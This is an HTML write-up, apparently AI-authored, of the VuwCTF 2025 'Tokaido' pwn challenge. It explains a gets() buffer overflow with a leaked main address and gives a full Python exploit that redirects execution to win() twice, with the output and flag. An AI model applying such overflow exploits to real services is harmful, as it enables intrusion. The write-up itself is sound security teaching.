@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tokaido Challenge Writeup | VuwCTF 2025</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --background-color: #f8f9fa;
+            --card-background: #ffffff;
+            --text-primary: #2c3e50;
+            --text-secondary: #7f8c8d;
+            --border-radius: 8px;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --code-bg: #2d3748;
+            --code-text: #e2e8f0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-primary);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background-color: var(--card-background);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+        }
+
+        h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .challenge-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .info-card {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            text-align: center;
+        }
+
+        .info-card strong {
+            display: block;
+            font-size: 1.1rem;
+        }
+
+        .section {
+            background-color: var(--card-background);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+
+        h2 {
+            color: var(--secondary-color);
+            border-bottom: 2px solid var(--secondary-color);
+            padding-bottom: 10px;
+            margin-top: 0;
+        }
+
+        h3 {
+            color: var(--primary-color);
+        }
+
+        code {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+
+        th {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+
+        ul, ol {
+            padding-left: 20px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+        }
+
+        .flag-highlight {
+            background-color: #fffde7;
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin: 20px 0;
+            font-weight: bold;
+            color: var(--accent-color);
+        }
+
+        .success-message {
+            background-color: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+        }
+
+        .toc-list {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .toc-list li {
+            margin-bottom: 10px;
+            padding-left: 20px;
+            text-indent: -20px;
+        }
+
+        .toc-list a {
+            text-decoration: none;
+            color: var(--secondary-color);
+            font-weight: 500;
+        }
+
+        .toc-list a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><span class="emoji">🎌</span> Tokaido Challenge Writeup</h1>
+            <p>CTF: VuwCTF 2025 | Category: Pwn | Difficulty: 100 points | Author: maxster</p>
+            <div class="challenge-info">
+                <div class="info-card">
+                    <strong>Status</strong>
+                    ✅ Solved
+                </div>
+                <div class="info-card">
+                    <strong>Points</strong>
+                    100
+                </div>
+                <div class="info-card">
+                    <strong>Category</strong>
+                    Pwn
+                </div>
+            </div>
+        </header>
+
+        <nav class="section">
+            <h2><span class="emoji">📋</span> Table of Contents</h2>
+            <ul class="toc-list">
+                <li><a href="#challenge-info">Challenge Information</a></li>
+                <li><a href="#recon">Initial Reconnaissance</a></li>
+                <li><a href="#analysis">Source Code Analysis</a></li>
+                <li><a href="#vuln">Vulnerability Analysis</a></li>
+                <li><a href="#strategy">Exploitation Strategy</a></li>
+                <li><a href="#exploit">The Exploit</a></li>
+                <li><a href="#results">Execution & Results</a></li>
+                <li><a href="#deep-dive">Technical Deep Dive</a></li>
+                <li><a href="#lessons">Lessons Learned</a></li>
+                <li><a href="#flag">Flag</a></li>
+            </ul>
+        </nav>
+
+        <section id="challenge-info" class="section">
+            <h2><span class="emoji">🎯</span> Challenge Information</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Parameter</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Challenge Name</td>
+                        <td>Tokaido</td>
+                    </tr>
+                    <tr>
+                        <td>Category</td>
+                        <td>Pwn</td>
+                    </tr>
+                    <tr>
+                        <td>Points</td>
+                        <td>100</td>
+                    </tr>
+                    <tr>
+                        <td>Files</td>
+                        <td><code>tokaido.c</code>, <code>tokaido</code> binary</td>
+                    </tr>
+                    <tr>
+                        <td>Remote Connection</td>
+                        <td><code>nc tokaido.challenges.2025.vuwctf.com 9983</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <section id="recon" class="section">
+            <h2><span class="emoji">🔍</span> Initial Reconnaissance</h2>
+            <p>Upon connecting to the service, we observe simple interaction:</p>
+            <pre>$ nc tokaido.challenges.2025.vuwctf.com 9983
+funny number: 0x56fd2a6432ce</pre>
+            <p>The server gives us a "funny number" - this will be important later!</p>
+        </section>
+
+        <section id="analysis" class="section">
+            <h2><span class="emoji">📝</span> Source Code Analysis</h2>
+            <p>Original source code <code>tokaido.c</code>:</p>
+            <pre>#include &lt;stdio.h&gt;
+
+int attempts = 0;
+
+void win() {
+    puts("you win");
+    if (attempts++ &gt; 0){
+        FILE *f = fopen("flag.txt", "r");
+        if (f) {
+            char read;
+            while ((read = fgetc(f)) != EOF) {
+                putchar(read);
+            }
+            fclose(f);
+        } else {
+             puts("flag file not found");
+        }
+    } else {
+        puts("not attempted");
+    }
+}
+
+int main() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf("funny number: %p\n", main);
+    char buffer[16];
+    gets(buffer);
+    printf("You said: %s\n", buffer);
+    return 0;
+}</pre>
+            <h3>Key Points</h3>
+            <ul>
+                <li><span class="emoji">📦</span> Buffer size: 16 bytes</li>
+                <li><span class="emoji">⚠️</span> Vulnerability: <code>gets()</code> - no boundary check!</li>
+                <li><span class="emoji">🎁</span> Info leak: Address of function <code>main()</code></li>
+                <li><span class="emoji">🏆</span> Win condition: Function <code>win()</code> must be called twice</li>
+            </ul>
+        </section>
+
+        <section id="vuln" class="section">
+            <h2><span class="emoji">🐛</span> Vulnerability Analysis</h2>
+            <h3>Buffer Overflow</h3>
+            <p>The function <code>gets(buffer)</code> reads input without checking the buffer size. This is a classic buffer overflow vulnerability!</p>
+            <h3>Memory Layout (x86-64)</h3>
+            <pre>+-----------------+--------------+------------------+
+|  buffer[16]     |  saved RBP   |  return address  |
+|                 |   (8 bytes)  |    (8 bytes)     |
++-----------------+--------------+------------------+
+     16 bytes         8 bytes         8 bytes</pre>
+            <p>To overwrite the return address, we need: 16 + 8 = 24 bytes of padding.</p>
+            <h3>Win Condition - The Trick!</h3>
+            <p>The function <code>win()</code> only prints the flag on its second call:</p>
+            <ul>
+                <li>First call: <code>attempts = 0</code> → prints "not attempted", but <code>attempts++</code> makes it equal to 1</li>
+                <li>Second call: <code>attempts = 1</code> → condition <code>attempts++ &gt; 0</code> is true → flag is printed!</li>
+            </ul>
+            <p>Conclusion: We need to call <code>win()</code> twice in one exploit!</p>
+        </section>
+
+        <section id="strategy" class="section">
+            <h2><span class="emoji">🎮</span> Exploitation Strategy</h2>
+            <h3>Step 1: Local Binary Analysis</h3>
+            <p>Compile a local copy with the same flags:</p>
+            <pre>gcc -no-pie -fno-stack-protector -z execstack -w -o tokaido tokaido.c</pre>
+            <p>Extract function addresses:</p>
+            <pre>$ objdump -t tokaido | grep -E "main|win"
+
+0000000000401196 g     F .text  00000000000000a1              win
+0000000000401237 g     F .text  0000000000000095              main</pre>
+            <p>Calculate offset: <code>offset = win - main = 0x401196 - 0x401237 = -0xA1</code></p>
+
+            <h3>Step 2: Payload Structure</h3>
+            <pre>payload = [16 bytes padding] + [8 bytes RBP] + [win_addr] + [win_addr]
+          └─ fill buffer ─┘ └─ saved RBP ─┘ └─ 1st call ─┘ └─ 2nd call ─┘</pre>
+
+            <h3>Step 3: Dynamic Address Calculation</h3>
+            <ol>
+                <li>Parse <code>main()</code> address from server output</li>
+                <li>Compute <code>win_addr = main_addr + offset</code></li>
+                <li>Build payload with the computed address</li>
+            </ol>
+        </section>
+
+        <section id="exploit" class="section">
+            <h2><span class="emoji">💣</span> The Exploit</h2>
+            <pre>import socket
+import struct
+import re
+
+HOST = "tokaido.challenges.2025.vuwctf.com"
+PORT = 9983
+WIN_OFFSET = -0xA1  # Calculated from local binary analysis
+
+def main():
+    with socket.create_connection((HOST, PORT)) as s:
+        s.settimeout(5.0)
+        
+         # Receive server banner and extract main address
+        banner = s.recv(1024).decode(errors='ignore')
+        print(f"[+] Server banner: {banner.strip()}")
+        
+        # Extract hex address using regex
+        match = re.search(r'0x([0-9a-fA-F]+)', banner)
+        if not match:
+            print("[!] Could not find main address in response")
+            return
+        
+        main_addr = int(match.group(0), 16)
+        win_addr = main_addr + WIN_OFFSET
+        
+        print(f"[*] main @ {main_addr:#x}")
+        print(f"[*] win  @ {win_addr:#x}")
+
+        # Construct payload
+        payload = b'A' * 16          # Fill buffer[16]
+        payload += b'B' * 8          # Overwrite saved RBP
+        payload += struct.pack('&lt;Q', win_addr)  # First win() call
+        payload += struct.pack('&lt;Q', win_addr)  # Second win() call
+
+        # Send exploit
+        print("[+] Sending exploit...")
+        s.sendall(payload + b'\n')
+        
+        # Receive full response
+        response = b""
+        while True:
+            try:
+                data = s.recv(4096)
+                if not data: 
+                    break
+                response += data
+            except socket.timeout:
+                break
+        
+        # Process and display response
+        decoded_response = response.decode(errors='ignore')
+        print("\n" + "="*60)
+        print("FULL SERVER RESPONSE:")
+        print(decoded_response)
+        print("="*60)
+        
+        # Extract flag (case-insensitive match)
+        flag_match = re.search(r'[Vv]uwCTF{[^}]+}', decoded_response)
+        if flag_match:
+            flag = flag_match.group(0)
+            print(f"\n🎉 SUCCESS! FLAG FOUND: {flag}")
+        else:
+            print("\n[!] FLAG NOT FOUND IN RESPONSE")
+            print("[*] Check payload construction and address calculation")
+
+if __name__ == "__main__":
+    main()</pre>
+        </section>
+
+        <section id="results" class="section">
+            <h2><span class="emoji">🚀</span> Execution & Results</h2>
+            <pre>$ python3 exploit.py
+[+] Server banner: funny number: 0x56fd2a6432ce
+[*] main @ 0x56fd2a6432ce
+[*] win  @ 0x56fd2a64322d
+[+] Sending exploit...
+
+============================================================
+FULL SERVER RESPONSE:
+AAAAAAAAAAAAAAAABBBBBBBB-2d*V^@^@-2d*V^@^@
+You said: AAAAAAAAAAAAAAAABBBBBBBB-2d*V
+you win
+not attempted
+you win
+VuwCTF{eastern_sea_route}
+============================================================
+
+🎉 SUCCESS! FLAG FOUND: VuwCTF{eastern_sea_route}</pre>
+            <div class="success-message">
+                <strong>What happened?</strong><br>
+                ✅ Retrieved the <code>main()</code> address<br>
+                ✅ Calculated the <code>win()</code> address<br>
+                ✅ Overwrote the return address twice<br>
+                ✅ First <code>win()</code> call: "not attempted" + <code>attempts++</code><br>
+                ✅ Second <code>win()</code> call: flag printed!
+            </div>
+        </section>
+
+        <section id="deep-dive" class="section">
+            <h2><span class="emoji">🧠</span> Technical Deep Dive</h2>
+            <ol>
+                <li><strong>Buffer Overflow Mechanics</strong><br>
+                The <code>gets()</code> function is an old, unsafe library function:
+                <pre>char buffer[16];
+gets(buffer);  // ⚠️ No size check!
+// It reads until a newline (\n) without limits, allowing overwrites of:
+// - Saved base pointer (RBP)
+// - Return address
+// - Other stack data</pre>
+                </li>
+                <li><strong>Return-Oriented Programming (ROP) Lite</strong><br>
+                While not a full ROP chain, the technique of overwriting the return address is fundamental to binary exploitation:<br>
+                Normal execution: <code>main() → return to OS</code><br>
+                Our exploit: <code>main() → win() → win() → crash (but we got the flag!)</code>
+                </li>
+                <li><strong>ASLR Bypass</strong><br>
+                ASLR randomizes memory addresses on each program run.<br>
+                Bypass:
+                <ul>
+                    <li>Server "leaks" the <code>main()</code> address</li>
+                    <li>We calculate the relative offset to <code>win()</code></li>
+                    <li>The offset is always constant: <code>win - main = -0xA1</code></li>
+                </ul>
+                </li>
+                <li><strong>Little-Endian Encoding</strong><br>
+                x86-64 uses little-endian byte order:
+                <pre>struct.pack('&lt;Q', 0x401196)
+# '&lt;' = little-endian
+# 'Q' = unsigned long long (8 bytes)
+# Address 0x401196 → bytes \x96\x11\x40\x00\x00\x00\x00\x00</pre>
+                </li>
+            </ol>
+        </section>
+
+        <section id="lessons" class="section">
+            <h2><span class="emoji">📚</span> Lessons Learned</h2>
+            <h3><span class="emoji">✨</span> Technical Takeaways</h3>
+            <ul>
+                <li>Analyze ALL program logic. The requirement to call <code>win()</code> twice was not obvious at first glance.</li>
+                <li>Dynamic address calculation is critical. Hardcoding addresses would fail due to ASLR.</li>
+                <li>Regex should be flexible. Case-insensitive flag search: <code>[Vv]uwCTF{[^}]+}</code>.</li>
+                <li>Stack structure matters. An 8-byte saved RBP after local variables is important for alignment.</li>
+            </ul>
+            <h3><span class="emoji">🛡️</span> Protective Mechanisms (Disabled in Challenge)</h3>
+            <ul>
+                <li><strong>Stack Canaries</strong>: Random value between buffer and return address.</li>
+                <li><strong>NX bit</strong>: Disallows code execution on the stack.</li>
+                <li><strong>PIE</strong>: Randomizes code address locations.</li>
+                <li><strong>ASLR</strong>: Randomizes library address locations.</li>
+            </ul>
+            <h3><span class="emoji">🎓</span> Practical Skills Demonstrated</h3>
+            <ul>
+                <li>✅ Buffer overflow exploitation</li>
+                <li>✅ Disassembled code analysis</li>
+                <li>✅ Python socket programming</li>
+                <li>✅ Understanding x86-64 architecture</li>
+                <li>✅ ASLR bypass techniques</li>
+            </ul>
+        </section>
+
+        <section id="flag" class="section">
+            <h2><span class="emoji">🏆</span> Flag</h2>
+            <div class="flag-highlight">
+                VuwCTF{eastern_sea_route}
+            </div>
+            <p>The name "Tokaido" (東海道) refers to a historical road along Japan's eastern coast, connecting Kyoto and Edo (modern Tokyo). The flag <code>{eastern_sea_route}</code> references this route!</p>
+        </section>
+
+        <footer>
+            <p>Writeup by: Assistant | Date: December 2025 | CTF: VuwCTF 2025</p>
+            <p><span class="emoji">🚩</span> Happy Hacking!</p>
+        </footer>
+    </div>
+</body>
+</html>
